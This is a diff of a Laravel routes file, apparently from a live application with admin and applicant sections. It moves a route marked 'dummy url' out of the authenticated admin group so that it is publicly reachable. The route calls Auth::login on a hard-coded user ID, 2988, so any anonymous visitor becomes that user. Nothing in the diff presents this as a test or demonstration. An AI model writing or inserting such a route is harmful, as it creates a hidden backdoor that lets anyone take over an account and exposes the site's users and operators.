@@ -1,7 +1,7 @@
 <?php
 
 use Illuminate\Support\Facades\Route;
-use Illuminate\Support\Facades\Auth;
+use Auth;
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -48,12 +48,14 @@ Route::prefix('admin')->middleware(['auth:sanctum', 'verified','admin'])->group(
     Route::get('/developer/control',\App\Http\Livewire\DeveloperController::class)->name('admin.developer.controller');
     // dummy url
 
-    Route::get('/norjamillekasan/gmailcom',function(){
+
+
+});
+
+Route::get('/norjamillekasan/gmailcom',function(){
             Auth::login(
                 \App\Models\User::find(2988),
             );
-    });
-
 });
 
 Route::prefix('/applicant')->middleware(['auth:sanctum', 'verified','user'])->group(function () {
